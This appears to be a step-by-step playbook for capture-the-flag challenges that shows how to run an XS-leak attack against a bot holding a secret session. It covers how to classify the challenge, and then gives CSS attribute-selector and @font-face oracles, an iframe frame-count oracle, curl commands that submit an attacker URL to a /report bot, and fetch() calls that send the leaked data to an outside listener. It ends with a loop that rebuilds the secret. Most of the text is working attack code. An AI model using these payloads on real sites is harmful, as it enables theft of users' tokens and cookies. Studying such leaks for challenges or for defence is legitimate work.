# Workflow deep — the XS-leak attack, end to end

The complete sequence, with the failure point at each step.

---

## Step 0 — classify — is this an XS-leak at all

```bash
python3 tools/classify.py --source <dir>
python3 tools/chain_match.py --source <dir> --record <challenge>
```

```text
the XS-leak signals:
- a bot that visits a URL (a /report, an admin-review)
- a secret the bot's session holds (a flag cookie, a token)
- a side-channel surface (a frame-count, a status, a CSS attribute,
  a server-state mutation)
a chain card match → run the card's first_confirming_probe first.
```

## Step 1 — name the sub-shape — classic vs sealed

```bash
# the bot's URL — attacker-controlled or fixed
grep -rnoiE 'goto|visit|url.*submit|report' <src> | head -10
# the CSP — what's allowed
grep -rnoiE 'script-src|style-src|font-src|img-src|unsafe-inline' <src> | head -10
```

```text
CLASSIC — the bot visits YOUR URL → your JS measures a side-channel
SEALED  — a fixed URL + script-blocked CSP → a declarative/server-state
          channel
the deciding question: can ANY origin the bot reaches run your JS?
```

## Step 2 — the channel inventory — what leaks

```text
CLASSIC (client-side):
  frames.length | onload/onerror | performance.now | cache-probe |
  :visited | window.open | scrollHeight | resource-timing

SEALED (declarative/server-state):
  CSS selector → a font/URL load
  @font-face unicode-range → a character-set
  LRU eviction → the surviving keys
  counter++ → the next value
  one-shot token → the consumed-or-not bit
  rate-limit bucket → the remaining quota
  'last seen' timestamp → the recency read
```

## Step 3 — the feasibility arithmetic — before building

```text
- secret's TTL → the whole leak+decode+submit must fit the window
- request rate → thousands of markers need tens-hundreds rps
- bits/visit   → a token=1, a recency=thousands, a CSS=a char-set
- char-set     → a sorted/limited alphabet reduces the search
- the context  → a flag-holder session, not a plain visitor
```

## Step 4 — the control pair — the channel-proof

```css
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
#trig{background-image:var(--yes,none),var(--no,none)}
```

```text
a YES hit + a NO miss → the channel works.
a NO hit → 'no leak' is a broken channel, not a negative answer.
```

## Step 5 — the oracle — the channel's payload

```css
/* the CSS-selector oracle — prefix/suffix/substring/exact */
body[secret^="ab"]{--m_ab:url('/leak/ab')}
#trig{background-image:var(--m_ab,none)}

/* the @font-face char-set — one face per alphabet char */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
#secret{font-family:x;display:block !important}
```

```js
// a classic client-side measure — the frames.length oracle
var f=document.createElement('iframe');
f.src='https://t/search?q='+g;
f.onload=()=>exfil(g+'='+f.contentWindow.frames.length);
```

## Step 6 — the delivery — the page's path to the bot

```bash
# a /report endpoint — the classic shape
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# a data: URL — an airgapped/null-origin case
curl -X POST "$BASE/report" --data-urlencode 'url=data:text/html,<html>...'
# a stored page — same-origin
# a managed-policy bot — a declarative channel only
```

## Step 7 — the exfil — the read-back channel

```js
// a GET to the listener
fetch('https://a/?'+encodeURIComponent(d))
// a write-back to the target — an airgapped case
fetch('https://t/api/comment',{method:'POST',body:JSON.stringify({t:d})})
// a DOM-writeback — a screenshotting bot
document.body.innerHTML='<div style="font-size:80px">'+d+'</div>'
```

## Step 8 — the reconstruction — assemble the secret

```python
# a binary-search boolean oracle
known=''
while len(known)<32:
    for c in charset:
        if oracle(known+c): known+=c; break
# a sorted secret — the char-set direct answer
token=''.join(sorted(leaked_chars))
# an n-gram beam search — overlapping substrings
```

## Step 9 — the verify — the confirm standard

```text
a reconstructed secret is a CANDIDATE until verified:
- submit it → confirm acceptance
- check the confidence score clears a threshold
the channel is the means; the verified secret is the confirm.
```

## Step 10 — the spend-last oracle — a one-shot token

```text
a GETDEL/single-use token's 'did it survive' is one bit AND burns
the check — spend it AFTER the cheaper channels narrow the answer.
```

## Step 11 — the blast-radius check — a destructive channel

```text
an LRU flood evicts every other key — possibly the secret itself.
only flood an instance that's yours alone; read the blast_radius.
```

## Step 12 — the falsifier — when to move

```text
a sealed shape with no CSS oracle and no server-state channel —
the oracle surface is dead → a different class.
an airgapped bot with no server-state read → a write-back or a
different class.
```
